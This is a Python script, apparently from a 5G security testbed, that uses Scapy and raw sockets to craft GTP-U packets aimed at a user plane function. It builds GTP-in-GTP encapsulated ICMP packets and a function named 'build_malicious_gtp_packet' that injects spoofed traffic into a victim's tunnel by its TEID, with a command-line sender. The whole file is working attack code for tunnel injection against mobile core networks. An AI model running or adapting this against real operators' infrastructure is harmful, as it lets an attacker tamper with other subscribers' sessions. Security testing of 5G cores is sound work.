from scapy.contrib.gtp import GTP_U_Header
from scapy.layers.inet import IP, ICMP, UDP

from src.utils.common import ip_list

import sys
import random
import socket


def new_seq():
    return random.randint(0, 0xFFFF)

def build_encapsulated_gtp_payload(upf_addr, teid_outer, teid_inner, ue_addr, src_addr_ue, src_addr):

    icmp_payload = ICMP(type=8, id=0x1234, seq=new_seq())
    ip_payload = IP(src=src_addr_ue, dst=ue_addr) / icmp_payload

    gtp_inner = GTP_U_Header(teid=teid_inner) / ip_payload

    gtp_outer = GTP_U_Header(teid=teid_outer) / gtp_inner
    udp_outer = UDP(sport=2152, dport=2152) / gtp_outer
    ip_outer = IP(src=src_addr, dst=upf_addr) / udp_outer

    return ip_outer

def build_malicious_gtp_packet(ue_src_addr, ue_dest_addr, victim_teid):
    
    ip_inbound_payload = IP(src=ue_src_addr, dst=ue_dest_addr) / ICMP(
        type=8, id=0x1234, seq=new_seq()
    )
    gtp_packet = GTP_U_Header(teid=victim_teid) / ip_inbound_payload

    ip_packet = (
        IP(src=ip_list["UERANSIM"], dst=ip_list["UPF"])
        / UDP(sport=2152, dport=2152)
        / gtp_packet
    )

    ip_packet = ip_packet.__class__(bytes(ip_packet))

    return ip_packet

def start_gtp_in_gtp_packet_from_ue(ue_src_addr, ue_dest_addr, victim_teid, iname):
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind((iname, 0))
    s.send(
        bytes(
            build_malicious_gtp_packet(
                ue_src_addr,
                ue_dest_addr,
                victim_teid,
            )
        )
    )

# We used socket because we had issues sending packet with scapy through specific interface 
# We tried eth layer but it didn't work

if __name__ == "__main__":

    gtp_packet = (
        IP(src=sys.argv[1], dst=ip_list["UPF"])
        / UDP(sport=2152, dport=2152)
        / GTP_U_Header(teid=int(sys.argv[3], 0))
    )

    icmp_packet = (
        gtp_packet
        / IP(src=sys.argv[1], dst=sys.argv[4])
        / ICMP(type=8, id=0x1234, seq=new_seq())
    )

    packet = icmp_packet.__class__(bytes(icmp_packet))
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind((sys.argv[2], 0))
    s.send(bytes(packet))
